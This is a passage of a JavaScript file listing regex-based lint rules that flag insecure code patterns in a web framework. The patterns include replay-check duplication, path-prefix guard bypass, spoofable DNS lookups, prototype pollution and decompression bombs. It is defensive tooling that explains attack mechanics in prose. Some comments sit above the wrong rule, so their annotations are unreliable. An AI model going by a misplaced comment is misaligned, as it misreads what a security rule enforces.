    // v0.15.13 — the JWT/DPoP verifiers hand-rolled the SAME anti-replay
    // enforcement (await replayStore.checkAndInsert; fail-closed on a store
    // throw; refuse on an already-seen jti) → b.nonceStore.enforceReplay.
    id: "replay-store-enforce-hand-rolled",
    primitive: "b.nonceStore.enforceReplay(store, jti, expireAtMs, { errorClass, storeFailedCode, replayCode, tokenLabel }) (lib/nonce-store.js) — single-use enforcement against a replay store: await store.checkAndInsert(jti, expireAtMs), raise the caller's typed error if the STORE throws (a store outage must NOT pass the token), and a distinct typed replay error if the jti was already seen. Hand-rolling `var inserted; try { inserted = await opts.replayStore.checkAndInsert(jti, ms); } catch (e) { throw new XError(storeFailedCode, 'replayStore.checkAndInsert threw: ' + ((e && e.message) || String(e))); } if (inserted === false) { throw new XError(replayCode, tokenLabel + \" jti='\" + jti + \"' has been seen before — replay refused\"); }` re-spells it; call nonceStore.enforceReplay(store, jti, ms, { … }).",
    // Anchors on `.checkAndInsert(...)` … `inserted === false` … `replay refused`
    // — the await-store + already-seen-refusal control flow. Allowlist: nonce-store.js
    // (the primitive's own body) + auth/oauth.js (verifyBackchannelLogoutToken uses a
    // DIFFERENT store (atomicReplayStore) + function-prefixed messages + a distinct
    // "already seen — replay refused (atomic)" wording — a genuinely-different atomic
    // back-channel-logout-token replay, not a standard jti check, so it keeps its inline form).
    regex: /\.checkAndInsert\([^)]*\)[\s\S]{0,240}?inserted === false[\s\S]{0,240}?replay refused/,
    skipCommentLines: true,
    allowlist: ["lib/nonce-store.js", "lib/auth/oauth.js"],
    reason: "auth/jwt + auth/dpop each hand-rolled the byte-identical anti-replay enforcement — `var inserted; try { inserted = await opts.replayStore.checkAndInsert(jti, expireAtMs); } catch (e) { throw new AuthError('<x>/replay-store-failed', 'replayStore.checkAndInsert threw: ' + ((e && e.message) || String(e))); } if (inserted === false) { throw new AuthError('<x>/replay', '<tokenLabel> jti=\\'' + jti + '\\' has been seen before — replay refused'); }` — differing only in the code prefix + tokenLabel ('token' vs 'DPoP proof'). A store outage MUST fail closed (not silently pass the token), and an already-seen jti MUST be refused — security control flow worth one home. Extracted b.nonceStore.enforceReplay(store, jti, expireAtMs, { errorClass, storeFailedCode, replayCode, tokenLabel }) and routed both (byte-identical messages reproduced via tokenLabel; pure refactor). Allowlist: nonce-store.js (the primitive's body) + auth/oauth.js (verifyBackchannelLogoutToken's atomic back-channel-logout-token replay diverges in store handle (atomicReplayStore), both messages (function-name-prefixed), and wording ('already seen — replay refused (atomic)') — a genuinely-different operation, kept inline). A re-introduced hand-rolled checkAndInsert + inserted===false replay refusal trips this — use b.nonceStore.enforceReplay.",
  },
  {
    id: "request-path-skip-match-hand-rolled",
    primitive: "b.requestHelpers.makeSkipMatcher(opts, label) (lib/request-helpers.js) — builds a (req) => boolean path predicate with SEGMENT-BOUNDARY string matching (\"/api\" matches /api and /api/x but NOT /apixyz), query-string stripped, req.pathname||url||originalUrl resolution, optional `exact` (whole-path) + `skip(req)` predicate, and build-time skipPaths validation. Hand-rolling `p = req.url; strip ?; for (entry of list) { if (p === entry || p.indexOf(entry + \"/\") === 0) return true; if (entry instanceof RegExp && entry.test(p)) return true; }` re-spells it — and a raw `p.indexOf(entry) === 0` form is a guard-BYPASS (over-matches the sibling path). Call requestHelpers.makeSkipMatcher({ skipPaths[, exact] }) once and call the returned predicate.",
    // Anchors on the segment-boundary string match `=== entry || …indexOf(entry + "/") === 0`.
    // The primitive's _skipStrMatch is the canonical impl (its single home), so the
    // allowlist names lib/request-helpers.js only.
    regex: /===\s*[a-zA-Z]+\s*\|\|\s*[a-zA-Z.]+\.indexOf\([a-zA-Z]+\s*\+\s*"\/"\)\s*===\s*0/,
    skipCommentLines: true,
    allowlist: ["lib/request-helpers.js"],
    reason: "The route-skip / mount-match loop was hand-rolled in 5 callers — auth/access-lock._isPassthrough, middleware/age-gate._shouldSkip, middleware/bot-disclose._matches, middleware/daily-byte-quota._shouldSkip (exact-only), middleware/api-encrypt._isExempt — while the 4 state-change guards (csrfProtect/fetchMetadata/botGuard/rateLimit) already used requestHelpers.makeSkipMatcher. SECURITY FIX folded in: makeSkipMatcher matched strings with a RAW startsWith (`path.indexOf(entry) === 0`), which over-matches past a segment boundary — a skipPath \"/api\" also skipped \"/apixyz\", bypassing the guard on an unintended sibling path. It now matches on a SEGMENT BOUNDARY (the form the 5 hand-rolled callers already used — evidence the raw-prefix primitive was the wrong one), strips the query string, resolves req.pathname||url||originalUrl, and takes an `exact` option (daily-byte-quota's whole-path semantics). All 5 callers route through it (bot-disclose keeps null-mountPaths = match-all; daily-byte-quota passes exact:true); the guards inherit the over-match fix. Allowlist names lib/request-helpers.js ONLY — _skipStrMatch is the canonical segment-boundary impl. A re-introduced hand-rolled path-skip loop (or a raw-startsWith over-match) trips this — use b.requestHelpers.makeSkipMatcher.",
  },
  {
    id: "stream-drain-to-buffer-hand-rolled",
    primitive: "b.safeBuffer.collectStream(stream, opts) (lib/safe-buffer.js) — Promise that drains a stream into a bounded Buffer (boundedChunkCollector + data/end/error wiring + destroy-on-cap/error), resolving the body or rejecting the typed cap/stream error. Hand-rolling `new Promise(res, rej => { var c = boundedChunkCollector(opts); stream.on(\"data\", ch => { try c.push(ch) catch(e){…rej(e)} }); stream.on(\"end\", () => res(c.result())); stream.on(\"error\", rej); })` re-spells it; call safeBuffer.collectStream(stream, { maxBytes, errorClass, sizeCode, sizeMessage }) and .then(transform) for any post-drain step.",
    // Anchors on the drain END handler: on("end", function … resolve(<collector>.result()).
    // Those tokens are adjacent (tight {0,120} window, not a brittle body-spanning
    // span). collectStream is the canonical impl (single home → allowlist). The
    // truncate-error-body (http-client) + 413-response (mail-deploy) outliers do NOT
    // resolve the collector result, so they never match.
    regex: /\.on\(\s*"end"\s*,\s*function[\s\S]{0,120}?resolve\(\s*[a-zA-Z_$][\w$]*\.result\(\)\s*\)/,
    skipCommentLines: true,
    allowlist: ["lib/safe-buffer.js"],
    reason: "7 modules hand-rolled the bounded stream→Buffer drain. 5 drain-to-resolve members routed through safeBuffer.collectStream (already the owning primitive): a2a-tasks._readBody, keychain._drain (keeps its null-stream guard), middleware/tus-upload._readChunk, mail-dav._readBodyBytes (keeps its req.body pre-check + .then), middleware/body-parser._bufferBody (keeps its Content-Length pre-check + a .catch that re-stamps the 413 statusCode). They converge onto collectStream's destroy-on-cap/error cleanup — strictly more correct than the prior reject-without-destroy / removeAllListeners variants (same promise outcome). The 2 remaining direct boundedChunkCollector users are genuine OUTLIERS, NOT drain-to-resolve: http-client._rejectStreamHttpError TRUNCATES the error body to a cap (subarray, never throws) and always rejects-with-body; mail-deploy._collectAndProcess is a res-writing handler (413 + audit + onRefuse on overflow, decompress on end) — neither resolves the collector result, so neither matches this END-handler anchor (and at 2 files they form no STRONG-DUP). Allowlist is lib/safe-buffer.js ONLY (collectStream IS the canonical end-handler). A re-introduced hand-rolled drain-to-resolve trips this — use b.safeBuffer.collectStream.",
  },
  {
    id: "raw-dns-txt-policy-lookup",
    primitive: "b.network.dns.resolver.safeResolveTxt(qname, { dnsLookup?, errorFactory, code }) / resolveTxt(qname, dnsLookup?) (lib/network-dns-resolver.js) — resolve a policy TXT record through the framework's validating (DoH/DoT/system, DNSSEC-checked) resolver, NOT plaintext system DNS. `dnsPromises.resolveTxt` (node:dns) is spoofable (DNS cache-poisoning / Kaminsky class); an attacker who forges a DMARC / BIMI / MTA-STS / TLS-RPT TXT can downgrade mail TLS, mislead VMC discovery, or redirect reports. Call networkDnsResolver().safeResolveTxt(qname, { dnsLookup, errorFactory, code }).",
    // Plain literal token — `dnsPromises.resolveTxt(` / `dns.promises.resolveTxt(`.
    // No char-window. The primitive uses the resolver's queryTxt, not the raw
    // node:dns resolveTxt, so it never trips.
    regex: /\bdns(?:Promises|\.promises)\.resolveTxt\(/,
    skipCommentLines: true,
    allowlist: [],
    reason: "SECURITY: BIMI (mail-bimi.fetchPolicy), MTA-STS (network-smtp-policy._fetchStsTxt) and TLS-RPT (network-smtp-policy.tlsRptFetchPolicy) policy TXT lookups used raw `dnsPromises.resolveTxt` (plaintext, spoofable system DNS), bypassing the framework's validating DoH/DNSSEC resolver — even though network-dns-resolver's own docs name MTA-STS verify + BIMI/VMC discovery as its consumers, and DMARC/DKIM/ARC (mail-auth) already used it. A spoofed _mta-sts TXT can downgrade mail TLS (the MTA-STS trigger); a spoofed BIMI TXT can mislead VMC discovery; a spoofed _smtp._tls TXT can redirect TLS-RPT reports. Extracted networkDnsResolver().resolveTxt + safeResolveTxt (one shared validating resolver, NXDOMAIN→null, typed throw) and routed all four _fetch members onto it — DMARC (mail-auth._fetchDmarcRecord) too. Operator dnsLookup overrides still honored. Allowlist is EMPTY: the primitive resolves via the resolver's queryTxt; zero lib/* use raw dnsPromises.resolveTxt now. A re-introduced raw plaintext TXT policy lookup trips this — use networkDnsResolver().safeResolveTxt.",
  },
  {
    // v0.10.16 (Codex P2 on v0.10.15 PR #104) — `Number(x) || 0`
    // coercion of an operator-untrusted JSON-source numeric field.
    // Silently accepts Infinity / NaN / negative / arbitrary
    // strings. Detector scoped to: `Number(` + kebab-cased bracket-
    // access (JSON-spec key convention per RFC 8460 / 7489) + `|| 0`.
    id: "number-coerce-or-zero-on-json-source",
    primitive: "validate finite non-negative integer explicitly; never silently coerce JSON-source untrusted numerics with `Number(x) || 0`",
    regex: /Number\s*\(\s*\w+\s*\[\s*["'][^"']*-[^"']*["']\s*\]\s*\)\s*\|\|\s*0\b/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P2 on v0.10.15 PR #104 flagged Number(summary['total-successful-session-count']) || 0 — silently accepted Infinity / NaN / negative on an audit-emitted summed path. Detector forces explicit validation discipline on new code.",
  },
  {
    // v0.14.21 — redis-client coerced entry-point numerics with bare
    // `Number(opts.X) || DEFAULT`: connectTimeoutMs:"abc" → NaN
    // silently became the default, a negative timeout sailed into
    // setTimeout, and maxReconnectAttempts:"abc" → NaN made the
    // `>= 0` reconnect-cap check false — silently DISABLING the
    // reconnect bound. Config-time entry-point opts THROW on bad
    // input; the coerce-or-default shape swallows exactly the typo
    // that tier exists to surface. Same class found and fixed in
    // pubsub-cluster + queue-sqs in the same release.
    id: "number-opts-coerce-or-default",
    primitive: "validateOpts.optionalPositiveInt / optionalPositiveFinite / optionalFiniteNonNegative (config-time throw) — never `Number(opts.X) || DEFAULT` coerce-or-default on an entry-point opt",
    regex: /=\s*Number\s*\(\s*opts\.\w+\s*\)\s*\|\|/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.14.21 — `Number(opts.X) || DEFAULT` on a config-time entry-point opt silently converts an operator typo (string, NaN, negative-via-||-passthrough) into the default or into garbage downstream (negative setTimeout, NaN disabling a `>= 0` cap check). Entry-point numerics route through the validateOpts helpers so the typo throws at boot. A genuinely defensive request-shape reader (returns-defaults tier) reads from a request object, not `opts.`, and is out of this regex's scope by construction.",
  },
  {
    // v0.14.21 — openapi-serve / asyncapi-serve admitted HEAD at the
    // dispatcher (`method !== "GET" && method !== "HEAD"` → handle)
    // but the body writer had no HEAD branch: it set Content-Length
    // AND wrote the full payload body for HEAD, violating RFC 9110
    // §9.3.2 (a HEAD response carries no body). The framework
    // convention (assetlinks / web-app-manifest / security-txt /
    // health / static / protected-resource-metadata) is per-middleware
    // suppression: headers as for GET, then `if (req.method ===
    // "HEAD") { res.end(); return; }`. Any file admitting HEAD
    // alongside GET must carry that suppression somewhere.
    id: "head-admitted-without-body-suppression",
    primitive: "after writeHead: `if (req.method === \"HEAD\") { res.end(); return; }` — HEAD carries the GET headers (incl. Content-Length) with no body (RFC 9110 §9.3.2)",
    regex: /!==\s*["']GET["']\s*&&\s*[\w.]+\s*!==\s*["']HEAD["']/,
    requires: /===\s*["']HEAD["']/,
    skipCommentLines: true,
    allowlist: [
      // CSRF-token method gate on the form BUILDER — decides whether a
      // hidden token field is emitted; no HTTP response is written, so
      // there is no body to suppress.
      "lib/forms.js",
      // CLIENT-side cache-eligibility check (RFC 9111 — only GET/HEAD
      // responses are cacheable) — consumes responses, never writes one.
      "lib/http-client-cache.js",
    ],
    reason: "v0.14.21 — openapi-serve/asyncapi-serve served the full JSON/YAML payload as a HEAD response body (RFC 9110 §9.3.2 violation; tests only drove GET). A dispatcher that admits HEAD promises HEAD semantics; the response writer must suppress the body. The `requires` companion is satisfied by the framework-standard `req.method === \"HEAD\"` end-without-body branch anywhere in the file.",
  },
  {
    // v0.14.21 (Codex P2 on PR #301) — the apiEncrypt per-session
    // (sid, ctr) replay claim expired with the staleness window
    // (`now + replayWindowMs`). The post-handler session write is
    // best-effort, so a failed write leaves lastReqCtr stale, and the
    // envelope `_ts` is plaintext metadata not bound into the AEAD —
    // an expired claim let the same captured (sid, ctr, _ct) replay
    // later with a fresh _ts and execute twice. The claim must live
    // until session.expiresAt.
    id: "session-replay-claim-window-expiry",
    primitive: "nonceStore.checkAndInsert(ctrKey, session.expiresAt) — a session-scoped replay claim lives as long as the session can accept requests, never just the staleness window",
    regex: /checkAndInsert\s*\(\s*ctrKey\s*,\s*now\s*\+/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P2 on v0.14.21 PR #301 — a replay claim that expires with the staleness window re-opens late replay when the post-handler session write fails best-effort and the request timestamp is not authenticated with the ciphertext. The (sid, ctr) tuple stays burned until session.expiresAt; per-session claim count is bounded by sessionMaxResponses.",
  },
  {
    // v0.14.21 — the api-encrypt envelope's plaintext metadata
    // (_ts/_nonce/_sid/_ctr) rode OUTSIDE the AEAD: a captured
    // bootstrap/per-request envelope could be replayed past the
    // staleness window with a rewritten _ts, and a captured response
    // could be replayed to the client under a bumped _ctr (the
    // client's monotonic check reads the plaintext field). Every
    // packed AEAD call in the envelope protocol now binds the
    // canonical _requestAad/_responseAad string; a two-arg
    // encryptPacked/decryptPacked on a protocol key is the regression.
    id: "apienc-envelope-metadata-unbound",
    primitive: "bCrypto.encryptPacked/decryptPacked with _requestAad(ts, nonce, sid, ctr) / _responseAad(sid, ctr) — the api-encrypt envelope's plaintext metadata is AEAD-bound on both protocol halves",
    regex: /\b(?:encryptPacked|decryptPacked)\s*\(\s*\w+\s*,\s*(?:perSessionKey|sessionKey)\s*\)/,
    skipCommentLines: true,
    allowlist: [
      // OpenPGP message session key (RFC 9580 vocabulary, same variable
      // name by coincidence) — the PGP packet format carries no plaintext
      // framework-envelope metadata; integrity is the OpenPGP MDC/AEAD
      // packet's own concern.
      "lib/mail-crypto-pgp.js",
    ],
    reason: "v0.14.21 — envelope freshness/routing fields (_ts/_nonce/_sid/_ctr) were not authenticated with the ciphertext, so capture-and-rewrite defeated the staleness gate (requests) and the monotonic counter check (responses). All six packed AEAD calls in lib/middleware/api-encrypt.js carry the canonical AAD; both protocol halves live in that one module and must stay byte-identical.",
  },
  {
    // v0.14.21 (Codex P2 on PR #301) — the SCIM bulk dependency
    // planner scanned only operation DATA for bulkId references;
    // a reference in the operation PATH ("PATCH /Groups/bulkId:g1")
    // was neither ordered nor substituted, so the adapter could
    // receive the literal token as a resource id, or the operation
    // failed despite the referenced POST succeeding. Planner and
    // executor must scan/substitute path segments alongside data
    // (RFC 7644 §3.7.2 — path references resolve like data references).
    id: "bulk-ref-scan-misses-path",
    primitive: "_pathBulkIdRefs(op) feeding the dependency plan + _resolvePathBulkIdRefs(path, bulkIdMap) before path parsing — every operator-visible bulkId reference surface resolves",
    regex: /_collectBulkIdRefs\s*\(/,
    requires: /_pathBulkIdRefs/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P2 on v0.14.21 PR #301 — bulkId cross-references appear in operation paths as well as operation data (RFC 7644 §3.7.2); a planner that scans only data leaves path-referencing operations unordered and lets the literal bulkId:<id> token reach the resource adapter. Any file collecting data refs must collect and substitute path refs too.",
  },
  {
    // Copying keys from one object to another with a raw bracket-assign
    // loop (`out[keys[i]] = src[keys[i]]`) writes attacker-chosen
    // property names when the source is parsed input: an own
    // `__proto__` key (JSON.parse materializes one) hits the
    // Object.prototype setter and grafts onto the target's prototype
    // chain (CWE-1321). validate-opts.assignOwnEnumerable is the
    // composing primitive — it skips __proto__/constructor/prototype
    // and takes a reserved-keys array, which also expresses the
    // filtered-copy variants (build the skip list, then copy).
    id: "raw-key-copy-loop-bypasses-assign-own-enumerable",
    primitive: "validateOpts.assignOwnEnumerable(target, source, reservedKeys) — prototype-safe own-enumerable key copy",
    regex: /\[\s*keys\[\w+\]\s*\]\s*=\s*[\w$.]+\[\s*keys\[\w+\]\s*\]/,
    skipCommentLines: true,
    allowlist: [
      // canonicalize() builds the hash input for persisted rowHash
      // chains — altering which keys are copied (sentinel skips) would
      // change historical hash inputs and break verifyChain on existing
      // rows. Row keys are schema-fixed audit columns, not parsed
      // remote input.
      "lib/audit-chain.js",
      // omit()/partial() are schema-shape transforms that map values
      // (`.optional()`) and track key arrays in the same pass; shapes
      // are boot-time operator literals, not parsed input.
      "lib/safe-schema.js",
    ],
    reason: "CodeQL js/remote-property-injection (high) on v0.14.22 PR #302 — jar.parse copied verified-JWT claim keys into the returned params object with a raw bracket-assign loop; a hostile request object carrying a `__proto__` claim grafts onto params' prototype chain. Every key-copy loop in lib/ composes assignOwnEnumerable; genuinely-different bodies carry an allowlist entry with the structural reason.",
  },
  {
    // A JWS/JWT builder that accepts caller-supplied extra
    // protected-header members must refuse the two members that change
    // what the signature is computed over: `b64` (RFC 7797 — unencoded
    // payload changes the signing input) and `crit` (RFC 7515 §4.1.11 —
    // promises the producer implements every extension it names). A
    // builder that copies them through while base64url-encoding the
    // payload mints a self-inconsistent JWS: a compliant verifier
    // derives a different signing input or refuses the critical header.
    // The `requires` companion is satisfied by the refusal branch
    // naming 'b64' somewhere in the same file.
    id: "db-query-write-without-residency-gate",
    primitive: "_assertLocalResidency(table, plaintextRow, op) before cryptoField.sealRow on every local write path",
    // A local write method that seals a row without first running the
    // residency gates can land a region-bound row (or region-bound
    // column value) outside the deployment's declared region set —
    // the cross-border transfer shape GDPR Art 44-46 / PIPL Art 38 /
    // DPDP §16 regulate. The gate must see the PLAINTEXT row, so it
    // runs before sealRow in the same method.
    regex: /sealRow\(this\._cryptoFieldKey\(\)/,
    requires: /_assertLocalResidency\(this\._cryptoFieldKey\(\)/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.14.24 — declareColumnResidency/assertColumnResidency shipped in v0.7.27 documenting a write-time gate that was never wired into any write path; rows and region-bound columns landed on any backend unchecked. Every db-query method that seals a row must run _assertLocalResidency on the plaintext first; a future write method (upsert, bulk path) inherits the requirement automatically.",
  },
  {
    id: "ar-header-prepend-without-forged-strip",
    primitive: "_stripForgedAuthResults(messageBuf, authservId) before prepending a computed Authentication-Results header",
    // A receiver that prepends its own Authentication-Results header
    // without first deleting sender-attached instances claiming the
    // same authserv-id lets a forged pre-attached verdict shadow the
    // computed one for downstream consumers (RFC 8601 §5 MUST).
    regex: /Buffer\.from\(\s*\w+\.authResults\s*\+/,
    requires: /_stripForgedAuthResults/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.14.23 — a receiver that prepends its computed Authentication-Results header without stripping sender-forged instances carrying its own authserv-id lets a downstream consumer reading 'the receiver's A-R header' read the attacker's instead. RFC 8601 §5 requires deleting (or renaming) same-authserv-id instances before adding the new one. Any code path that prepends an emitted A-R header must compose the strip helper in the same file.",
  },
  {
    id: "jose-header-passthrough-without-b64-crit-refusal",
    primitive: "refuse own 'b64'/'crit' members on any caller-supplied JOSE protected-header object before signing",
    regex: /assignOwnEnumerable\s*\(\s*\{\s*\}\s*,\s*opts\.header/,
    requires: /["']b64["']/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P2 on v0.14.22 PR #302 — jws.sign reserved alg/typ/kid but passed every other caller header member into the protected header; `{ b64: false, crit: [\"b64\"] }` produced a compact JWS whose payload was base64url-encoded and signed as such while the header claimed RFC 7797 unencoded-payload semantics. Any caller-header pass-through must name-refuse b64/crit until those semantics are actually implemented.",
  },
  {
    // v0.10.15 — `zlib.gunzipSync` / `zlib.createGunzip` /
    // `zlib.brotliDecompress` without an output-size cap is the
    // CVE-2025-0725 / CWE-409 decompression-amplification
    // class. Attackers craft a kilobyte of compressed input that
    // explodes to gigabytes of output, exhausting memory before the
    // request handler sees the bytes. The defense is either the
    // `maxOutputLength` opt (Node-native) OR a streaming pipe with
    // a byte-counter that destroys at the cap. Both are caught by
    // requiring the gunzip call to sit within ~20 lines of a
    // numeric cap reference (`maxOutputLength` or a constant of
    // the framework's `C.BYTES.*` shape).
    // v0.11.3 (Codex P1 on PR #108) — `_parseADualCidr` silently
    // accepted empty digit segments (`a/`, `a//`, `mx/`, `mx//`) by
    // letting the `if (X.length > 0)` guard skip the parseInt branch
    // and keep the default /32 or /128. RFC 7208 §5.3/§5.4 grammar
    // requires `1*DIGIT` after the slash; empty MUST permerror. The
    // silent-default bug over-authorized senders publishing
    // `v=spf1 a/ -all` (would match every IP in the /32 of every A
    // record). Detector scoped to the bug class: any `.slice(1)`
    // followed within ~80 chars by an `if (<name>.length > 0)` guard
    // followed within ~160 chars by `parseInt(...)` MUST be paired
    // (somewhere in the same file) with an explicit empty-segment
    // refusal phrasing. New cidr-length / prefix-length / port-range
    // parsers added to lib/ inherit the discipline automatically.
    id: "slice1-optional-parseint-silent-default",
    primitive: "after `var X = Y.slice(1)`, refuse empty-digit segment with an explicit throw BEFORE parseInt; never silently default to the no-suffix mask",
    regex: /\.slice\s*\(\s*1\s*\)\s*;(?:(?!\n\s{0,2}\}|\bparseInt\s*\()[\s\S]){0,400}?if\s*\(\s*\w+\.length\s*>\s*0\s*\)\s*\{(?:(?!\n\s{0,2}\})[\s\S]){0,800}?\bparseInt\s*\(/,
    requires: /(?:cidr-length is empty|prefix-length is empty|grammar requires 1\*DIGIT)/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P1 on v0.11.3 PR #108 — _parseADualCidr (lib/mail-auth.js) accepted empty digit segments (a/, a//, mx/, mx//) as valid by treating missing CIDR digits as defaults, can over-authorize senders publishing `v=spf1 a/ -all`. RFC 7208 §5.3/§5.4 grammar requires 1*DIGIT after the slash. Detector forces the discipline: any slice(1) + optional-parse parseInt MUST be paired with an explicit empty-segment refusal in the same file.",
  },
  {
    id: "gunzip-without-output-size-cap",
    primitive: "zlib.gunzipSync(buf, { maxOutputLength: <C.BYTES.* constant> }) — bound decompression at config time",
    // Match a gunzip call NOT immediately preceded or followed by
    // `maxOutputLength:`. The regex catches the call shape; the
    // companion `requires` ensures the same file names the
    // bounding opt somewhere within. Files using a custom
    // byte-counter-on-pipe path (rare) carry an explicit allowlist
    // entry with a documented reason.
    regex: /\bzlib\.(?:gunzipSync|createGunzip|brotliDecompressSync|createBrotliDecompress)\s*\(/,
    requires: /\bmaxOutputLength\b/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CVE-2025-0725 (libcurl + zlib decompression amplification) + CWE-409 (uncontrolled-resource decompression bomb) class. Every gunzip / brotli decompress on operator-supplied bytes MUST bound the output. Use `zlib.gunzipSync(buf, { maxOutputLength: <C.BYTES.* constant> })` so the operator sees the cap at config time; refusal becomes a typed error before the bomb reaches memory.",
  },
  {
    // Citation hygiene — a CVE identifier is always
    // CVE-<4-digit-year>-<sequence>, where the sequence is purely
    // numeric (CVE numbering spec). Two malformed shapes ship past
    // review: a non-numeric sequence (`CVE-2024-zlib` — a library
    // name dropped in as a placeholder), and a real id with a
    // hyphen-attached word (`CVE-2024-39687-class` — reads as if
    // `-class` is part of the id). The first is a fabricated
    // reference; the second is a parse hazard for any tool that
    // extracts CVE tokens. The annotation convention is a SPACE
    // before the descriptor (`CVE-2024-39687 class`), which leaves
    // the id token well-formed. This detector refuses both shapes:
    // a letter immediately after the year separator, OR a
    // hyphen-then-letter after the numeric sequence. It cannot
    // verify that a well-formed id is real or correctly attributed —
    // that stays a reviewer responsibility — but it makes the
    // structurally-invalid class impossible to ship. Real CVE
    // ranges (`CVE-2023-51764 / -51765`) and id-then-space-descriptor
    // forms pass unchanged.
    id: "malformed-cve-identifier",
    primitive: "cite a real CVE as CVE-<year>-<digits> (all-numeric sequence) then a SPACE before any descriptor — never a non-numeric sequence or a hyphen-attached word",
    regex: /CVE-[0-9]{4}-(?:[0-9]*[A-Za-z]|[0-9]+-[A-Za-z])/,
    allowlist: [],
    reason: "A CVE identifier's sequence number is always numeric and the token ends at the sequence (CVE-<year>-<digits>). A non-numeric sequence (CVE-2024-zlib) is a fabricated placeholder; a hyphen-attached word (CVE-2024-39687-class) makes the id un-parseable. Cite a verifiable CVE followed by a space before any class/descriptor word, or name the weakness class (CWE / RFC).",
  },

  {
    // Codex P1 on v0.13.12 PR #234 — the MX listener's command pump was
    // made async (gates do DNS / store lookups), and the plaintext
    // socket.on("data") path was routed through a per-connection
    // serialization chain (`_feedChunk`). But the post-STARTTLS TLSSocket
    // fed `_ingestBytes` directly from a sync onData callback that ignored
    // the returned promise — so on the upgraded socket (where the default
    // strict/balanced profiles actually run the gates) async gate awaits
    // could overlap later TLS chunks and gate rejections went unhandled
    // instead of producing the 421 path. The invariant: the async command
    // pump (`_ingestBytes`) is fed ONLY through `_feedChunk` (the
    // `return _ingestBytes(...)` form), so every transport — plaintext and
    // TLS — shares the one serialized chain. A bare `_ingestBytes(` call
    // anywhere else is a second, un-serialized feed path. The lookbehind
    // exempts the function definition (`function _ingestBytes`) and the
    // single legitimate caller (`return _ingestBytes`); `_ingestBytes` is
    // unique to lib/mail-server-mx.js so this is effectively file-scoped.
    id: "mx-ingest-bytes-bypasses-feed-pump",
    primitive: "feed the MX command pump only via _feedChunk (`return _ingestBytes(...)`); never call _ingestBytes directly from a sync callback — it drops the async pump's promise and breaks command serialization + the 421 error path",
    regex: /(?<!function )(?<!return )\b_ingestBytes\s*\(/,
    allowlist: [
      // The submission listener has its OWN _ingestBytes, and it is
      // SYNCHRONOUS — its only async work (SASL AUTH) is handled via
      // internal .then() chains inside the command handler, and RFC 4954
      // §4 forbids clients pipelining commands across AUTH until the
      // response is received, so a sync pump is spec-acceptable there.
      // There is no async-promise to drop, so the bare `_ingestBytes(`
      // call is safe. This invariant guards the MX listener's async pump
      // specifically; if the submission pump is ever made async, route it
      // through a _feedChunk equivalent and drop this allowlist entry.
      "lib/mail-server-submission.js",
    ],
    reason: "Codex P1 on PR #234: the async MX command pump must be fed through the single per-connection serialization chain (_feedChunk → `return _ingestBytes`). A bare `_ingestBytes(` call from a sync callback (the original post-STARTTLS onData) ignores the returned promise, letting async HELO/RBL/greylist gate awaits overlap later chunks and turning gate rejections into unhandled rejections instead of the 421 path. Route every transport (plaintext + TLS) through _feedChunk.",
  },

  {
    // Codex P1 on v0.12.6 PR #157 — `_anyValueToProto`'s negative-int
    // path emitted `pb.embeddedMessage(N, pb._writeVarint(v >>> 0))`
    // which (a) wraps a varint payload in wire-type 2 (length-delimited)
    // instead of wire-type 0 (varint, which int64 mandates per the
    // proto3 spec), AND (b) truncates negatives via `v >>> 0` losing
    // both sign and magnitude beyond 32 bits. Collectors reject the
    // whole batch when they decode a wire-type mismatch on a known
    // scalar field, so a single negative AnyValue poisons the export.
    //
    // The right shape is `pb.int64(field, value)` (10-byte two's-
    // complement varint for negatives via BigInt) or `pb.sint64` (ZigZag
    // when small negatives dominate). The detector flags the
    // `embeddedMessage(N, ..._writeVarint...)` shape that mixes
    // wire types — wrapping a raw varint in a length-delimited message
    // is almost always a bug. Operators legitimately wrapping
    // `_writeVarint` bytes inside `embeddedMessage` for a packed-repeated
    // field MUST allowlist with a written reason.
    id: "protobuf-embeddedmessage-wrapping-varint",
    primitive: "Use `pb.uint64` / `pb.int64` / `pb.sint64` / `pb.uint32` for scalar varint fields; `embeddedMessage` is for nested message bodies, not raw varints. Mixing wire types causes collectors to reject the whole payload.",
    regex: /pb\.embeddedMessage\s*\([^)]*pb\._writeVarint/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P1 on v0.12.6 PR #157 — `_anyValueToProto` negative-int path wrapped a varint payload in `embeddedMessage` (wire-type 2) instead of using `int64` (wire-type 0 varint). The wire-type mismatch poisons the whole OTLP batch; the `v >>> 0` truncation also dropped sign + high bits. Fixed by adding `pb.int64` + `pb.sint64` to the encoder + routing the negative-int branch through `pb.int64`. Detector locks the shape: `embeddedMessage(N, _writeVarint(...))` cannot recur.",
  },

  {
    // Codex P1 on v0.12.7 PR #158 — archive-read.extract's rollback
    // cleanup deleted PRE-EXISTING destination files when a later
    // entry failed. The renameSync(tmpPath, resolvedPath) silently
    // overwrote operator files at the destination, then on abort the
    // catch-block rmSync wiped them out — permanent data loss
    // disguised as atomic rollback. Fix: refuse to write when the
    // destination path already exists; force operators to extract
    // into a fresh / empty subtree.
    //
    // Detector scope: any lib/archive*.js or lib/safe-archive.js file
    // that calls renameSync into a path it ALSO tracks for cleanup
    // MUST refuse overwrite up-front. Codify as a file-scoped invariant:
    // archive-read.js must contain "destination-exists" refusal code.
    id: "archive-extract-overwrite-without-refusal",
    primitive: "extract loops in lib/archive-read.js MUST refuse to write to a destination path that already exists — atomic rollback via tmp-rename + tracked-path cleanup is only safe when every tracked path was newly created. Pre-existing files at the destination + catch-block rmSync = data loss.",
    // File-scoped: only fires on archive-read.js / safe-archive.js
    // shape. The pattern is renameSync of a tmpPath onto resolvedPath
    // (the canonical destination variable) — atomic-file.js's
    // operator-file rename is a different shape (operator already
    // owns the destination context); http-client.js's atomic-tmp
    // rename writes operator-supplied paths under operator-supplied
    // tmp dirs, also a different concern.
    regex: /written\.push\s*\(\s*\{[^}]*path:\s*resolvedPath/,
    requires: /destination-exists/,
    skipCommentLines: true,
    allowlist: [],
